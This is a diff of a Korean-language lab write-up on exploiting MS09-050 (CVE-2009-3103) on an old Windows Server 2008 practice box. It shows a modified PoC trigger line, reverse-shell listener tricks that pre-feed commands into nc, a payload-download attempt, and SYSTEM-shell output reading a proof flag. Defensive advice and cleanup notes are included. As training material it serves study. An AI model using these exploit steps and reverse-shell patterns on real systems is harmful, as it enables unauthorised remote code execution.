-**`2.0.2`(SMBv2) 방언이 사라졌다.** 정찰 때 있던 것이 없다. CVE-2009-3103 은 바로 그 `srv2.sys`(SMBv2 드라이버) 결함이고, **반복 익스플로잇이 `srv2.sys` 를 wedge 시킨 것**이다(크래시했으나 전체 BSOD 까지는 안 가 SMBv1 `srv.sys` 만 남음). SMBv2 협상이 죽었으니 취약 코드 경로 자체가 사라져 재진입 불가.
+— 출처: `~/PG/Internal/smb_postrevert2.log`(01:54)
 
-여기서 신호를 오독하지 않는 게 중요하다 — **SMBv1(NT LM 0.12) 응답이 살아 있는 것은 복구가 아니다.** `srv.sys`(SMBv1)는 애초에 고장난 적이 없다. SMBv2 생사는 `--script smb2-capabilities` 로 따로 물어야 갈린다: 죽었을 때는 `SMB 2+ not supported`(`smb2_recheck.log`), 살아났을 때는 `2.0.2: Distributed File System`(`smb_postrevert2.log`). smb-protocols 의 `2.0.2` dialect 줄과 이 둘을 함께 보면 오판이 없다.
+`srv.sys`(SMBv1)는 안 죽어 445 응답 자체는 살아 있으므로 **「복구됐다」로 오판하기 쉬움** — SMBv2 생사는 위처럼 따로 물어야 함. 상세 시행착오(SMBv2 wedge·revert 미반영 검산·트리거 별도 고장)는 [[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]] · [[_PLAYBOOK#A-46. 다단계 익스플로잇은 각 단계를 «따로» 검증한다]] 로 이관.
 
-srv2.sys 자연 복구를 기대하며 재확인 간격을 늘려갔다 — try6→try7 은 ~10분, try7→try8 은 ~15분 벌려 try8(01:27)까지 봤으나 SMBv2 는 돌아오지 않았다(try4~try8 전 구간 ~27분). Server 2008 에서 srv2.sys 크래시는 **재부팅 전까지 복구되지 않는다.** try8 이 최종 확인(여전히 `IO_TIMEOUT`).
+### Post-Exploitation
 
-> [!warning] 커널 익스플로잇은 "한 발"이다
-> BOF·커널 RCE 처럼 메모리를 깨는 익스플로잇은 성공하면 **그 세션에서 목표(플래그)를 끝내라.** 재시도는 공짜가 아니다 — 대상 드라이버를 죽여 스스로 문을 닫는다. 이 박스가 그 교과서적 사례다. 셸을 잡은 즉시 칠 것: `type C:\Users\Administrator\Desktop\proof.txt`.
+**Proof.txt value:** `f4afb9b13d59235cb9c8892707256f7d`
 
-### try9~try17 — revert 이후 재시도, 그리고 트리거가 따로 고장나 있었다는 발견
+```text
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
 
-revert 를 요청받아 재시도했다. 결과부터: **여전히 실패**. 그런데 실패 원인이 하나가 아니었고, 계층을 가르는 과정에서 앞선 진단 하나가 반증됐다.
+C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
+f4afb9b13d59235cb9c8892707256f7d
 
-**증상**: PoC 를 그대로 쏘니 트리거 단계가 `NT_STATUS_LOGON_FAILURE`(정상)가 아니라 **`NT_STATUS_IO_TIMEOUT`** 으로 바뀌어 있었다. 콜백 없음(`try9_postrevert.log`).
+C:\Windows\system32>whoami
+nt authority\system
 
-**계층 1 — 트리거가 고장났다(익스플로잇과 무관한 별개 결함).**
-익스플로잇을 **쏘지 않은 상태**에서 SMB 건강을 직접 재봤다(`try10_smbhealth_noexploit.log`). 결과가 갈렸다:
-- `nmap --script smb-os-discovery,smb-protocols` → **정상 동작**. `Computer name: internal`, dialects `NT LM 0.12` 회수.
-- `rpcclient -U Administrator%wrongpass` → **`NT_STATUS_IO_TIMEOUT`**.
+C:\Windows\system32>hostname
+internal
 
-같은 서버에 nmap 은 되고 Samba 클라이언트는 안 된다. 첫 가설은 "Samba 4.x 의 `client min protocol` 기본값이 SMB2 라서"였는데 **틀렸다** — `testparm -sv | grep 'client min protocol'` 이 `LANMAN1` 을 뱉었고, `--option='client min protocol=NT1'` 을 줘도 그대로 타임아웃이었다(`try11_rpcclient_nt1.log`).
+C:\Windows\system32>whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
+nt authority\system
+internal
+   IPv4 Address. . . . . . . . . . . : 192.168.248.40
+Thu 08/20/2026 
+10:03 AM
+f4afb9b13d59235cb9c8892707256f7d
 
-진짜 원인은 `min` 이 아니라 **`max`** 였다. Samba 는 SMBv1 형식 negotiate 를 보내면서 **협상 가능한 방언 목록에 `SMB 2.002` 를 함께 실어 보낸다**(SMB2 업그레이드용). nmap 의 `smb-protocols` 는 SMBv1 방언만 나열한다. 그래서 `client max protocol=NT1` 로 SMB2 방언 광고를 끄자:
+C:\Windows\system32>dir /b /s C:\Users\proof.txt
+C:\Users\Administrator\Desktop\proof.txt
+
+C:\Windows\system32>
 ```
-=== smbclient max=NT1 ===
-session setup failed: NT_STATUS_LOGON_FAILURE
-```
-출처 `try12_maxproto_nt1.log`. **정상 세션이 성립했다** — negotiate·session setup 이 오가고 인증만 거부된 것으로, PoC 가 필요로 하는 **인증 이벤트가 실제로 발생**한다.
+— 출처: `~/PG/Internal/flag_evidence.txt`. 대화형 `cmd.exe`(웹셸 아님)에서 `type` 으로 읽음 — OSCP 인정 형식. 타겟 시간대는 UTC-7(PDT) — `date /t` 의 `08/20/2026` 은 Kali/KST(UTC+9) 기준 08/21 새벽 02:03 과 같은 순간(`smb-os-discovery` 의 `System time … -07:00` 으로 확인). 자기모순 아님, 타임존 차이.
 
-정리하면 이 서버는 **`SMB 2.002` 방언이 언급된 negotiate 만 골라서 응답 불능**이다. 순수 SMBv1 negotiate 는 멀쩡히 처리한다. `srv2.sys` 가 죽었다는 진단과 정확히 들어맞고, 이번엔 메커니즘까지 드러났다.
-
-그래서 PoC 의 트리거를 갈아끼웠다(`exploits/ms09_050_revshell_pad_smbtrig.py`):
-```python
-subprocess.call("smbclient -L //%s --option='client max protocol=NT1' -U 'Administrator%%wrongpass'" % target, shell=True)
-```
-
-**계층 2 — 트리거를 고쳐도 injection 이 안 먹는다.**
-고친 트리거로 4회 발사(try13~try16). 매번 `session setup failed: NT_STATUS_LOGON_FAILURE` = 트리거는 정상 작동. 그런데 **콜백 0건**. 트리거가 살아난 뒤에도 안 되므로, 실패 지점은 트리거가 아니라 **injection 단계** — `srv2.sys` 가 악성 negotiate 를 파싱하지 못한다. SMBv2 공격면은 실제로 소멸했다.
-
-**계층 3 — revert 가 실제로는 일어나지 않았다(정량 반증).**
-"revert 했는데 왜 SMBv2 가 안 돌아오나"를 추측하지 않고 재부팅 여부를 직접 쟀다. 타겟이 보내는 **TCP timestamp 옵션(`TS val`)은 부팅 시 리셋되는 단조 증가 카운터**다. 두 pcap 에서 뽑았다(`try17_uptime_probe.log`):
-
-| 시각 | 타겟 `TS val` | 출처 |
-|---|---|---|
-| 00:56:05 | 6113 | `try2.pcap` |
-| 01:42:33 | 284901 | `try9.pcap` |
-
-Δt = 2788초, ΔTS = 278788 → **정확히 100.0 tick/s**. 즉 두 시점 사이에 카운터가 **끊김 없이 선형으로** 증가했다. 01:35 경에 재부팅이 있었다면 카운터는 리셋돼 01:42 에 4만대여야 한다. 실측 284901 은 00:55경부터 쉬지 않고 돌아온 값(2849초 ≈ 47.5분, 00:55:04 + 47.5분 = 01:42:34)과 일치한다.
-
-**결론: 이 인스턴스는 재부팅된 적이 없다.** revert 가 반영되지 않았다. `srv2.sys` 는 여전히 죽어 있고, 진짜 재부팅 전에는 어떤 PoC 수정으로도 재진입할 수 없다.
-
-> [!tip] "서버가 죽었다"를 주장하려면 무엇이 죽었는지까지 갈라라
-> 이 절에서 클라이언트 도구 셋이 서로 다른 답을 냈다 — nmap 성공 / rpcclient 타임아웃 / smbclient 는 옵션에 따라 둘 다.
-> **도구가 다르게 실패하면 서버가 아니라 요청이 다른 것이다.** 여기서는 "negotiate 에 SMB2 방언이 실렸는가"가 갈림길이었고, 그걸 찾자 서버 상태(어느 드라이버가 죽었나)가 특정됐다.
-> 그리고 **"재부팅했다"는 주장은 TCP timestamp 로 검산할 수 있다.** 부팅 시 리셋되는 카운터라 두 시점 샘플의 선형성만 보면 된다.
-
-### try22 이후 — 박스는 실패할 때마다 BSOD 후 스스로 재부팅한다 (진짜 revert 이후)
-
-관리자가 revert 를 실제로 실행한 뒤(1차는 확인 다이얼로그를 안 눌러 반영 안 됐던 것) `smb-protocols` 에 `2.0.2` 가 돌아왔다. 여기서 이 박스의 진짜 성질이 드러났다.
-
-- 정찰 때 성공했던 원본 PoC(`ms09_050_revshell_pad.py`, rpcclient 트리거)를 쐈더니 이번엔 곧바로 콜백 없이 `NT_STATUS_IO_TIMEOUT`. 직후 `nmap -p445` 가 **`filtered`** → 20초 뒤 **`closed`** → 다시 **`open`** 으로 바뀌며 `2.0.2` 가 저절로 복귀했다. 즉 **실패한 익스플로잇이 `srv2.sys` 를 죽여 BSOD → 호스트 자동 재부팅(~90초) → SMBv2 재생**의 사이클이다.
-- 그래서 재진입에 수동 revert 가 필요 없다. **"SMBv2(2.0.2)가 광고될 때까지 기다렸다가 한 발 쏘고, 콜백 없으면 재부팅을 기다렸다가 다시" 를 반복하는 루프**로 붙는다(`attempt_loop.sh`). 실측으로 매번 1~2 시도 안에 셸이 붙었다.
-- **왜 어떤 발은 되고 어떤 발은 BSOD 만 내는가**: 이 익스플로잇은 커널 메모리를 깨는 것이라 성공/크래시가 확정적이지 않다. return address·magic index 가 그 부팅의 메모리 배치와 맞아떨어져야 셸이 뜨고, 아니면 크래시다. 첫 정찰 때 한 방에 됐던 것은 운이 좋았던 것.
-
-이 사이클을 안 뒤 플래그는 금방 잡혔다. 리스너 stdin 을 미리 채워(3장의 auto-feed) 콜백 4초 뒤 `type proof.txt` 가 실행되게 했고, 첫 성공 셸에서 바로 회수했다. flag `f4afb9b13d59235cb9c8892707256f7d`.
-
-> [!warning] 커널 익스플로잇 셸은 "잡는 것"보다 "짧게 사는 것"이 문제다
-> 이 박스에서 셸을 세 번 잃었다 — (1) `Ctrl-C` 로 로컬 nc 를 죽여서, (2) 파이프·`&` 조합에 셸이 hang, (3) 연결 직후 호스트가 다시 BSOD. 대책은 **대화형으로 타이핑하지 않는 것**이다. `nc` stdin 을 `{ sleep N; echo cmd; } | nc` 로 미리 채워 **콜백 즉시 목표 명령이 자동 실행**되게 하면, 셸이 몇 초만 살아도 플래그를 회수한다. 시험장에서 불안정한 셸을 만나면 이 패턴을 먼저 떠올려라.
-
-> [!danger] tmux 로 리스너를 돌릴 때 `sudo nc` 는 세션을 죽여도 살아남는다
-> `tmux kill-session` 은 페인의 bash 와 스크립트를 죽이지만 그 자식인 **`sudo nc` 는 detach 되어 계속 445→443 콜백을 가로챈다.** 이 좀비 nc 가 다음 발사의 콜백을 먹어 새 리스너(feed 가 붙은)가 굶는 사고가 반복됐다. 정리는 반드시 **`ss -lntp` 로 PID 를 특정해 그 nc 만 kill** 하라. ⛔ `pkill -f 'nc -lvnp'` 같은 광범위 kill 은 **같은 호스트의 다른 박스 리스너까지 죽인다**(실제로 이 세션엔 다른 타겟의 nc 가 공존했다 — PID 특정 덕에 건드리지 않았다).
-
-## 7. OSCP 시험 관점
-
-1. **구형 Windows + 445 열림 → nmap `--script smb-vuln-*` 가 첫 수다.** MS08-067/MS09-050/MS17-010 을 CVE 스크립트로 골라내라. 배너의 빌드 번호(`6.0.6001` = 2008 SP1)로 세대를 좁힌다.
-2. **공개 PoC 는 실행 전에 읽는다.** LHOST 하드코딩, python2/모듈 의존성, **페이로드 길이 제약**이 흔한 함정. 이 박스는 shellcode 길이가 패킷 길이 필드와 안 맞아 조용히 실패했다 — NOP 패딩으로 원본 길이에 맞추는 게 핵심.
-3. **수동 대안**: msfconsole 없이 `msfvenom`(shellcode) + 손질한 PoC + `nc` 로 끝냈다. msfvenom·nc 는 전 대상 허용이라 시험에서 이 방식이 안전하다. metasploit `ms09_050_smb2_negotiate_func_index` 모듈을 쓰면 "1대 한정" 예산을 소모한다 — 이 박스엔 굳이 쓸 필요가 없다.
-4. **시간 배분 / 손절**: 커널 익스플로잇은 성공 즉시 플래그를 회수하라. 재시도로 시간을 태우지 말 것 — 실패하면 대상이 이미 불안정해진 것이고, 그때는 재시도가 아니라 **revert 요청**이 정답이다. 이 세션의 손실은 전부 "첫 셸에서 플래그를 안 읽은 것"에서 파생됐다.
-5. **리버스셸이 안 붙으면**: 아웃바운드(443→80→53)를 의심하기 전에 **tcpdump 로 계층을 분리**하라. 이 박스에선 아웃바운드는 멀쩡했고 문제는 페이로드였다 — pcap 이 그걸 즉시 갈라줬다.
-6. **익스플로잇 체인의 각 단계를 독립적으로 검증하라.** 이 박스의 PoC 는 injection 과 trigger 두 단계인데, 재시도 국면에서 **trigger 가 injection 과 무관한 이유로 따로 고장나 있었다**(Samba 가 SMB2 방언을 광고해 응답 불능 서버와 협상 실패). trigger 를 고치기 전에는 "injection 이 안 된다"고 말할 근거조차 없었다. 단계가 둘 이상이면 **각각을 따로 성공시켜 본 뒤** 전체 실패를 논하라.
-7. **"박스를 revert 했다"를 검산하는 법**: 타겟 TCP 응답의 `TS val`(timestamp 옵션)은 부팅 시 리셋된다. 두 시점을 샘플링해 **선형이면 재부팅이 없었던 것**이다. revert 가 반영 안 된 채 시간을 태우는 사고를 막는다.
-
-## 8. 방어 관점
-
-- **MS09-050 패치(2009년) 적용** 또는 취약 세대 OS(2008 SP1/Vista) 폐기. 근본 해결은 SMBv2 초기 드라이버를 안 쓰는 것.
-- **445/139 를 인터넷·비신뢰 세그먼트에 노출하지 않는다.** SMB 는 내부 전용, 경계에서 차단.
-- 레거시가 불가피하면 **SMBv1 비활성화 + 최신 방언 강제**, 호스트 방화벽으로 SMB 를 관리 네트워크로만 제한.
-
-## 9. 참고 자료
-
-- CVE-2009-3103 / MS09-050 / Microsoft Security Advisory 975497
-- EDB 40280 (`windows/remote/40280.py`, ohnozzy `MS09_050.py`) — 이 노트의 PoC 원본
-- `~/PG/Internal/exploits/ms09_050_revshell_pad.py` — 검증된 수정본(길이 패딩 포함)
-
-## 남긴 흔적
-
-이 세션에서 타겟에 남긴 것 — **파일 업로드·계정 생성·설정 변경은 없다.** 리버스셸만 잡았다. (harvest 를 위해 `powershell ... DownloadFile` 로 `C:\Windows\Temp\h.ps1` 을 받으려 했으나 PowerShell 부재로 실패 — **파일은 생성되지 않았다.**)
-- **BSOD·자동 재부팅**: 실패한 발사와 성공 셸의 종료로 타겟이 여러 번 재부팅됐다. 이 박스의 정상 동작이다(6장). 정리 시점에 박스는 살아 있었다(`445 open`).
-- 커널 후킹(`sysenter` hook)의 잔존 여부는 **확인하지 않았다** — 셸이 짧게 죽어 점검 불가. 어차피 재부팅마다 초기화된다.
-- Kali 측 정리 **확인함**: 내가 만든 tmux 세션(`int_*`) 전부 종료, 내가 띄운 `sudo nc` 리스너 전부 **PID 특정 kill**, `python http.server` 종료, 443/80 에 내 프로세스 없음. **같은 Kali 에 공존한 다른 타겟(192.168.248.220)의 nc(pid 373831–373838)는 건드리지 않았다** — PID 특정 정리 덕분. 로그·pcap·스크립트는 **전량 보존**(`try1`~`try31`, 2개 pcap, `listener_*.sh`, `attempt_loop.sh`). 지운 것 없음. 상세는 `~/PG/Internal/traces_confirmed.log`.
+**남긴 흔적**
+- 타겟에 파일 업로드·계정 생성·설정 변경 없음. 리버스셸만 잡음. (harvest 를 위해 `powershell ... DownloadFile` 로 `C:\Windows\Temp\h.ps1` 을 받으려 했으나 PowerShell 부재로 실패 — 파일은 생성되지 않음)
+- BSOD·자동 재부팅 — 실패한 발사와 성공 셸의 종료로 타겟이 여러 번 재부팅됨. 이 박스의 정상 동작(`Privilege Escalation` 절 참조). 정리 시점에 박스는 살아 있었음(`445 open`)
+- 커널 후킹(`sysenter` hook)의 잔존 여부는 확인하지 않음[관측 없음] — 셸이 짧게 죽어 점검 불가. 재부팅마다 초기화됨
+- Kali 측 정리 확인함 — 만든 tmux 세션(`int_*`) 전부 종료, 띄운 `sudo nc` 리스너 전부 **PID 특정 kill**, `python http.server` 종료, 443/80 에 잔존 프로세스 없음. **같은 Kali 에 공존한 다른 타겟(192.168.248.220)의 nc(pid 373831–373838)는 건드리지 않음** — PID 특정 정리 덕분. 로그·pcap·스크립트 전량 보존(`try1`~`try31`, pcap 2개, `listener_*.sh`, `attempt_loop.sh`). 지운 것 없음
+— 출처: `~/PG/Internal/traces_confirmed.log`
 
 ## 관련
 
-- [[_STATUS]]
-- 같은 부류(구형 Windows SMB 원격 RCE): MS17-010/MS08-067 계열 박스와 상호 참조 대상.
+- CVE-2009-3103 / MS09-050 / Microsoft Security Advisory 975497
+- EDB 40280(`windows/remote/40280.py`, ohnozzy `MS09_050.py`) — 이 노트의 PoC 원본. 검증된 수정본: `~/PG/Internal/exploits/ms09_050_revshell_pad.py`
+- [[_PLAYBOOK#A-34. 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다]] · [[_PLAYBOOK#A-46. 다단계 익스플로잇은 각 단계를 «따로» 검증한다]] · [[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]]
